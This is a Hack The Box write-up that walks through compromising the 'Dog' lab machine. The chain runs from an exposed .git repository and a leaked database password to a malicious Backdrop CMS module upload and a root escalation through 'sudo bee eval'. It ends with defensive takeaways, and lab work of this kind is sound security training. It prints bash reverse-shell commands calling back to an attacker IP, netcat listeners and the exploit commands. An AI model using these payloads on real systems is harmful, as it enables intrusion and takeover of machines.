# HTB Write-Up: Dog

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Dog)        |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Samurai                                                         |
| Date       | April 24, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Exposed Git Repository & Credential Discovery](#2-enumeration--exposed-git-repository--credential-discovery)
3. [Initial Access — Backdrop CMS 1.27.1 RCE via Malicious Module](#3-initial-access--backdrop-cms-1271-rce-via-malicious-module)
4. [Lateral Movement — Credential Reuse](#4-lateral-movement--credential-reuse)
5. [Privilege Escalation — Sudo bee eval Arbitrary PHP Execution](#5-privilege-escalation--sudo-bee-eval-arbitrary-php-execution)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** followed by an aggressive **Nmap** scan for service and version fingerprinting:

```bash
rustscan -a 10.129.231.223 --ulimit 5000
nmap -A -p22,80 10.129.231.223
```

**Open Ports:**

| Port | Service | Details                                                    |
|------|---------|------------------------------------------------------------|
| 22   | SSH     | OpenSSH 8.2p1 (Ubuntu 20.04)                              |
| 80   | HTTP    | Apache 2.4.41 — **Backdrop CMS 1** — `.git` directory exposed |

The Nmap output surfaced two immediately critical findings without any further enumeration:

- **`http-generator`** identified the application as **Backdrop CMS 1**, a specific and version-fingerprintable CMS.
- **`http-git`** confirmed a publicly accessible `.git` directory at `/.git/`, with a last commit message referencing Backdrop CMS documentation — meaning the full application source code and history is recoverable.
- **`robots.txt`** listed 22 disallowed paths including `/admin`, `/user/login`, and `/user/register`, confirming the CMS admin interface is present.

---

## 2. Enumeration — Exposed Git Repository & Credential Discovery

### 2.1 — Dumping the Git Repository

The exposed `.git` directory was dumped in full using **git-dumper**, which reconstructs a complete local copy of the repository from the exposed object store:

```bash
git-dumper http://10.129.231.223/.git/ ./git-dump
```

This provided the complete Backdrop CMS source tree, including all configuration files.

### 2.2 — Database Credentials in settings.php

The Backdrop CMS main configuration file `settings.php` was examined. It contained a hardcoded database connection string with plaintext credentials:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

The MySQL root password `BackDropJ2024DS2024` was extracted. In shared hosting and CMS environments, database passwords are frequently reused as CMS admin passwords or OS-level account passwords — making this a high-value credential to test broadly.

### 2.3 — CMS Version Identification

The Backdrop CMS version was confirmed from the packaging metadata included in the dumped repository:

```bash
cat git-dump/core/profiles/testing/testing.info
# version = 1.27.1
# timestamp = 1709862662
```

**Backdrop CMS 1.27.1** is affected by a known authenticated Remote Code Execution vulnerability via malicious module upload.

### 2.4 — User Enumeration via CMS Account Pages

Backdrop CMS exposes user profile pages at `/?q=accounts/<username>`. A username wordlist was fuzzed against this endpoint to identify valid accounts — a 403 response (rather than 404) indicates the user exists but the profile is private:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://10.129.231.223/?q=accounts/FUZZ
```

**Valid usernames identified:** `john`, `tiffany`, `John`, `morris`

The recovered database password was tested against each discovered account via the CMS login. The account **`tiffany`** with password `BackDropJ2024DS2024` was valid and held **administrator privileges** on the Backdrop CMS instance.

---

## 3. Initial Access — Backdrop CMS 1.27.1 RCE via Malicious Module

### 3.1 — Vulnerability Background

Backdrop CMS allows administrators to install modules by uploading a compressed archive. The application performs insufficient validation on uploaded module contents, permitting the inclusion of arbitrary PHP files. When the module is installed, these files are extracted to the web root and become directly accessible — resulting in a web shell or reverse shell.

### 3.2 — Generating the Malicious Module

A public proof-of-concept exploit for Backdrop CMS 1.27.1 was used to generate the malicious module package:

```bash
python3 exploit.py http://10.129.231.223
# Evil module generated! shell.zip
# Shell address: http://10.129.231.223/modules/shell/shell.php
```

The exploit generated a `.zip` archive. However, the Backdrop module installer required a **gzip-compressed tar archive** (`.tar.gz`). The module directory was repackaged accordingly:

```bash
tar -czvf shell.tar.gz shell/
```

### 3.3 — Installing the Module and Triggering the Shell

The `shell.tar.gz` archive was uploaded via the Backdrop admin module installer at `/admin/modules/install` using the authenticated `tiffany` session. After installation, a netcat listener was opened and the reverse shell was triggered via the deployed PHP shell:

```bash
# Attacker — listener
rlwrap nc -lnvp 9001

# Payload sent to shell.php
bash -c 'bash -i >& /dev/tcp/10.10.15.33/9001 0>&1'
```

**Result — Shell obtained as `www-data`:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.231.223] 38946
www-data@dog:/var/www/html/modules/shell$
```

**User flag retrieved from `/home/johncusack/user.txt`.**

---

## 4. Lateral Movement — Credential Reuse

Post-exploitation enumeration of `/home` identified a local user `johncusack`. The database password recovered from `settings.php` was tested against this account:

```bash
su johncusack
# Password: BackDropJ2024DS2024
```

The `johncusack` account reused the database password — a common credential hygiene failure in environments where developers manage both the application and the underlying system.

---

## 5. Privilege Escalation — Sudo bee eval Arbitrary PHP Execution

### 5.1 — Sudo Enumeration

Available sudo permissions were inspected for `johncusack`:

```bash
sudo -l
```

**Output:**

```
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

`johncusack` can run `bee` as root without restriction. **bee** is the Backdrop CMS command-line management utility, analogous to Drupal's `drush`. Critically, it exposes an `eval` subcommand that executes arbitrary PHP code within the CMS context — and when invoked via sudo, this PHP execution occurs as `root`.

### 5.2 — Verifying PHP Execution

The `eval` subcommand was tested to confirm arbitrary code execution:

```bash
sudo bee eval 'echo "Hello from Backdrop!";'
```

Execution was confirmed. A second netcat listener was opened and the `shell_exec` PHP function was used to issue a bash reverse shell:

```bash
# Attacker — listener
rlwrap nc -lnvp 9002

# Payload
sudo bee eval 'shell_exec("/bin/bash -c \"bash -i >& /dev/tcp/10.10.15.33/9002 0>&1\"");'
```

**Result — Root shell obtained:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.231.223] 56100
root@dog:/var/www/html#
```

**Root flag retrieved from `/root/root.txt`.**

---

## 6. Summary

| Phase                  | Technique                                                           | Result                              |
|------------------------|---------------------------------------------------------------------|-------------------------------------|
| Recon                  | RustScan + Nmap -A                                                  | `.git` exposure and CMS version identified |
| Git Dump               | `git-dumper` — full repository extraction                           | `settings.php` with DB credentials |
| User Enumeration       | ffuf against `/?q=accounts/FUZZ`                                    | Valid CMS usernames identified      |
| Credential Spray       | DB password tested against CMS accounts                             | Admin access as `tiffany`           |
| Initial Access         | Backdrop CMS 1.27.1 malicious module upload → reverse shell        | Shell as `www-data`                 |
| Lateral Movement       | DB password reused as OS account password                           | Shell as `johncusack`               |
| Privilege Escalation   | `sudo bee eval` — arbitrary PHP execution as root                  | Root shell                          |

### Key Takeaways

- **Exposed `.git` directories on web servers are a critical information disclosure vulnerability.** A publicly accessible `/.git/` allows complete source code recovery including all historical commits. Web server configurations must explicitly deny access to `.git` directories, and production deployments should never be made from repositories cloned directly into the web root.
- **Database credentials in configuration files should never be reused as CMS or OS account passwords.** The single password `BackDropJ2024DS2024` unlocked the database connection, the CMS admin account, and a local OS user account — demonstrating how a single credential finding can cascade into full system compromise. Each service and account should use a unique credential.
- **CMS module installers that accept arbitrary archives are a high-risk feature for authenticated attackers.** Restricting module installation to verified sources, disabling the upload feature in production, or requiring a separate admin confirmation step significantly reduces the risk of authenticated RCE via malicious modules.
- **Granting sudo access to CMS CLI tools with `eval` or equivalent subcommands is equivalent to granting a root shell.** Any tool that can execute arbitrary code — bee, drush, wp-cli, artisan — when run under sudo provides an immediate privilege escalation path. Sudo rules should be scoped to specific safe subcommands rather than the entire binary, and audited regularly.
